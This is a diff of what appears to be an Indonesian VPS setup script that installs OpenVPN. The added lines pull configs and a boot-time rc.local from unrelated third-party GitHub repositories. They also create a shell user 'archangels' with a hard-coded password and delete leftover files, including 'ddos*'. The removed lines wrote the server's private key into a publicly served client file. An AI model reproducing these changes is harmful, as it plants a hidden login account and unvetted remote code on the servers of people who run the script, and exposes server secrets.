@@ -164,15 +164,11 @@ wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/ara-ranger
 #  openvpn
 apt-get -y install openvpn
 cd /etc/openvpn/
-wget -O openvpn.tar "https://raw.githubusercontent.com/GakodArmy/kiayam/main/Bebeb/openvpn.tar"
+wget -O openvpn.tar "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/openvpn.tar"
 tar xf openvpn.tar;rm openvpn.tar
 wget -O /etc/rc.local "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/rc.local"
 chmod +x /etc/rc.local
 
-# server settings
-cd /etc/openvpn/
-wget -O /etc/openvpn/server.conf "https://raw.githubusercontent.com/GakodArmy/kiayam/main/Bebeb/server.conf"
-systemctl start openvpn@server
 sysctl -w net.ipv4.ip_forward=1
 sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
 iptables -t nat -I POSTROUTING -s 192.168.100.0/24 -o eth0 -j MASQUERADE
@@ -185,26 +181,21 @@ systemctl daemon-reload
 /etc/init.d/openvpn restart
 wget -qO /etc/openvpn/openvpn.bash "https://raw.githubusercontent.com/ara-rangers/vps/master/openvpn.bash"
 chmod +x /etc/openvpn/openvpn.bash
+# etc
+wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/client.ovpn"
+wget -O /home/vps/public_html/udp.ovpn "https://raw.githubusercontent.com/bengali89/Haruhara/main/joie8383/udp.ovpn"
+wget -O /home/vps/public_html/ovpnssl.ovpn "https://raw.githubusercontent.com/bengali89/Haruhara/main/joie8383/ovpnssl.ovpn"
+wget -O /home/vps/public_html/client1.ovpn "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/client1.ovpn"
+sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/udp.ovpn
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client1.ovpn
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client3.ovpn
+useradd -m -g users -s /bin/bash archangels
+echo "7C22C4ED" | chpasswd
+echo "UPDATE DAN INSTALL SIAP 99% MOHON SABAR"
+cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
 
-# openvpn config
-wget -O /etc/openvpn/client.ovpn "https://raw.githubusercontent.com/GakodArmy/kiayam/main/Bebeb/client.conf"
-sed -i $MYIP2 /etc/openvpn/client.ovpn;
-echo '<ca>' >> /etc/openvpn/client.ovpn
-cat /etc/openvpn/ca.crt >> /etc/openvpn/client.ovpn
-echo '</ca>' >> /etc/openvpn/client.ovpn
-sed -i $MYIP2 /etc/openvpn/client.ovpn;
-echo '<cert>' >> /etc/openvpn/client.ovpn
-cat /etc/openvpn/server.crt >> /etc/openvpn/client.ovpn
-echo '</cert>' >> /etc/openvpn/client.ovpn
-sed -i $MYIP2 /etc/openvpn/client.ovpn;
-echo '<key>' >> /etc/openvpn/client.ovpn
-cat /etc/openvpn/server.key >> /etc/openvpn/client.ovpn
-echo '</key>' >> /etc/openvpn/client.ovpn
-sed -i $MYIP2 /etc/openvpn/client.ovpn;
-echo '<tls-auth>' >> /etc/openvpn/client.ovpn
-cat /etc/openvpn/tls-auth.key >> /etc/openvpn/client.ovpn
-echo '</tls-auth>' >> /etc/openvpn/client.ovpn
-cp client.ovpn /home/vps/public_html/
 
 # install stunnel
 apt-get install stunnel4 -y
